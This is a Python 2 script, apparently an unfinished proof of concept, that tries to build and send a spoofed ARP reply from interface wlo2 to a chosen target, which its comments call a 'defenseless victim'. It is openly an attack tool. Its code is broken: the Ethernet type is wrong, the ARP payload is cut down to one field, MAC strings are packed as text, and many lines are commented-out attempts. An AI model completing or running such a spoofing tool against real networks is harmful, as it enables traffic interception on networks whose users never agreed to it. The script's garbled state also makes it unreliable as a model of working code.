#!/usr/bin/python
import socket
import struct
import sys
import socket

# This code sends an ARP packet using the interface wlo2
# The idea is to create spoof ARP packets and verify that this PoC works 

def create_ARP_pack(target_mac, target_ip, spoof_mac, spoof_ip):
  # Adding data to the Packet (this is the ethernet portion 
  # The Ethernet header contains Destination MAC (6 bytes), Source MAC (6 bytes) and Ethernet type (2 bytes)
  # To "create" the MAC addresses; from 'aabbccddeeff' we will use .decode('hex') result is: \xaa\xbb\xcc\xdd\xee\xff
#  target_mac = target_mac.decode('hex')
#  spoof_mac = spoof_mac.decode('hex')
  eth_type = '0800'
  ethernet_type = eth_type.decode('hex')
#  packet = struct.pack('>6s6s2sHH2sH6s4s6s4s', target_mac, spoof_mac, ethernet_type)

  ####  ARP Section  ###
  # hardware address type: 2 byte (H)  - 1 for Ethernet (or 6 for IEEE 802 LAN)
  # protocol address type: 2 byte (H)  - 2048 IPv4 (0x0800)
  # hardware address length: 1 byte (B) - 6 for Ethernet/IEEE 802
  # protocol address length: 1 byte (B) - 4 for IPv4
  # operation: 2 byte (H)  - 1 for Request (or 2 for Reply)
  # source MAC address: 4 byte (I)  - 08:00:27:ed:
  # source MAC address (contd): 2 byte (H)- 70:ae
  # source IP address: 2 byte (H)  - 192.168.
  # source IP address (contd): 2 byte (H) - 1.111
  # target MAC address: 2 byte (H)  - 00:00:
  # target MAC address (contd): 4 byte (I)- 00:00:00:00
  # target IP address: 4 byte (I)  - 192.168.1.1

  # Hardware Type: Ethernet
  HW_Type = 1
#  HW_Type = HW_Type.decode('hex')
  # Protocol type IPv4
  Pro_Type = 0x800
#  Pro_Type = Pro_Type.decode('hex')
  # Hardware Address Length: Specifies how long hardware addresses are in this message. 
  # For Ethernet or other networks using IEEE 802 MAC addresses, the value is 6.
  HLN = 6
#  HLN = HLN.decode('hex')
  # Protocol Address Length: Again, the complement of the preceding field; specifies how long protocol 
  # (layer three) addresses are in this message. For IP(v4) addresses this value is of course 4.
  PLN = 4
#  PLN = PLN.decode('hex')
  # OPCode Specifies the Nature of the ARP message being sent. First 2 values are used for regular ARP
  # ARP Request -> 0x0001 ; ARP Reply -> 0x0002
  OPCode = 2
#  OPCode = OPCode.decode('hex')
# source MAC address: 4 byte (I)  - 08:00:27:ed:
  source_mac_1 = int(spoof_mac[0:8],16)
# source MAC address (contd): 2 byte (H)- 70:ae
  source_mac_2 = int(spoof_mac[8:],16)
# source IP address: 2 byte (H)  - 192.168.
  ip_pzs = spoof_ip.split('.')
  s_ip_bits_1 = ip_pzs[0] + '.' + ip_pzs[1]
# source IP address (contd): 2 byte (H) - 1.111
  s_ip_bits_2 = ip_pzs[2] + '.' + ip_pzs[3]
  # target MAC address: 2 byte (H)  - 00:00:
  target_mac_1 = int(target_mac[0:4], 16)
  # target MAC address (contd): 4 byte (I)- 00:00:00:00
  target_mac_2 = int(target_mac[4:], 16)
  # target IP address: 4 byte (I)  - 192.168.1.1
  target_ip



  
  # Create and Return a packet
#  print target_mac, spoof_mac, ethernet_type, HW_Type, Pro_Type, HLN, PLN, OPCode, spoof_mac, s_ip_bits, target_mac, d_ip_bits
  eth_header = struct.pack('>6s6s2s' ,target_mac, spoof_mac, ethernet_type)
#  arp_pack = struct.pack('>HHBBHIHHHHII', HW_Type, Pro_Type, HLN, PLN, OPCode, source_mac_1, source_mac_2, s_ip_bits_1, s_ip_bits_2, target_mac_1, target_mac_2, target_ip)
  arp_pack = struct.pack('>H', 2)
#  arp_pack = struct.pack("!HHBBHIHHHHII", 1, 0x0800, 6, 4, 1, 0x080027ed, 0x70ae, 0xc0a8, 0x016f, 0x0000, 0x00000000, 0xc0a80101)

#  packet = struct.pack('>4s4sss4s6s4s6s4s', target_mac, spoof_mac, ethernet_type, HW_Type, Pro_Type, HLN, PLN, OPCode, spoof_mac, s_ip_bits, target_mac, d_ip_bits)
#  print packet
  return (eth_header, arp_pack)

def send_packet(packet):
  rawSocket = socket.socket(socket.PF_PACKET, socket.SOCK_RAW, socket.htons(0x0800))
  rawSocket.bind(("wlo2", socket.htons(0x0800)))
  rawSocket.send(packet[0] + packet[1])
  print 'Packet Sent!!'
  
def main():
  args = sys.argv[1:]
  if len(args) < 4 :
    print 'Usage: Spoof_ARP.py Target_MAC_Addr Target_IP_Addr Spoof_MAC_Addr Spoof_IP_Addr'
    print 'The MAC addresses must be in the format aabbccddeeff. The IP Addresses must be in the format: 192.168.1.2'
    print 'This program does an ARP spoof By sending an ARP packet to the Target Machine containing the Spoof data'
  else:
    # Ordering the received arguments into their corresponding variables
    target_mac = args[ 0]
    target_ip = args[1]
    spoof_mac = args[2]
    spoof_ip = args[3]
    # Creating the ARP packet (and the underlying Ethernet packet too)
    packet = create_ARP_pack(target_mac, target_ip, spoof_mac, spoof_ip)
    # Sending the packet to our defenseless victim !! muajajajajaja 
    send_packet(packet)

if __name__ == '__main__':
  main()
